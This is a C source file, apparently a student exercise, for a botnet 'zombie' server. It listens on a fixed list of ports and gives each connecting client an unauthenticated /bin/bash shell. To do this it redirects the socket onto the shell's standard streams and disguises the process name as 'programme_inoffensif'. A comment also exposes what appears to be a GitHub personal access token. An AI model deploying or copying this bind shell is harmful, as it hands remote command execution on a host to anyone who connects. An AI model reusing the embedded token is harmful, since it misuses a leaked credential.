#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
//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
#include "utils_v2.h"
#include "port.h"
#include "botNet.h"

int getFreePort(int sockfd);
int validPort(int sockfd,int port);

Zombie zombie;
int tabChild[BACKLOG];
int numberChild;
int tabNewSockFd[BACKLOG];

Zombie initSocketServer(bool withPort, int portReceived){
int sockfd = ssocket();
	int port;
	if(withPort == true)
	{
		port = validPort(sockfd,portReceived);
	}else
	{
		port = getFreePort(sockfd);
	}
	
	slisten(sockfd, BACKLOG);
	Zombie zombie=
	{
		"zombiO.c", "127.0.0.1", port, sockfd,0 
	};
	return zombie;
}

void createBash (void * sock){	
	
	zombie.pid=getpid();
	int* socket = sock;
	swrite(*socket, &zombie, sizeof(Zombie));
	
	for (int i = 0; i < 3; ++i){
		dup2(*socket,i);
	}
	sexecl("/bin/bash", "programme_inoffensif", NULL);

}

void done(){
	for (int i = 0; i < numberChild; ++i){
		skill(tabChild[i],SIGINT);
		close(tabNewSockFd[i]);
	}
	sclose(zombie.sockFd);
	exit(0);
}

int main(int argc, char const *argv[]){
	if(argc == 2)
		zombie = initSocketServer(true,atoi(argv[1]));
	else 
		zombie = initSocketServer(false,-1);
	
	ssigaction(SIGINT,done);


	printf("Le serveur tourne sur le port : %i \n", zombie.port);	
	int newsockfd =0;

	while((newsockfd = saccept(zombie.sockFd))>0){	
		int childId=fork_and_run1(createBash,&newsockfd);
		tabNewSockFd[numberChild]=newsockfd;
		tabChild[numberChild]=childId;
		numberChild++;	

	}
	return 0;
}

int getFreePort(int sockfd){
	
  	
	for (int i = 0; i < 10; ++i)
	{
	struct sockaddr_in addr;  
  	memset(&addr,0,sizeof(addr));
  	addr.sin_family = AF_INET;
  	addr.sin_port = htons(tabPorts[i]);
 	addr.sin_addr.s_addr = htonl(INADDR_ANY);
 	int optval = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);
	int ret = bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
	if(ret != -1)
		return tabPorts[i];
	}

	perror("Tous les ports sont utilisées");
  	exit(1);
}

int validPort(int sockfd,int port){

for (int i = 0; i < 10; ++i)
	{
		if(port == tabPorts[i])
		{
			struct sockaddr_in addr;  
  			memset(&addr,0,sizeof(addr));
  			addr.sin_family = AF_INET;
  			addr.sin_port = htons(port);
 			addr.sin_addr.s_addr = htonl(INADDR_ANY);
			int ret = bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
			if(ret != -1)
				return tabPorts[i];
		}	

	}

	
	perror("Votre port est invalide(pas dans la liste des 10)  ");
  	exit(1);

}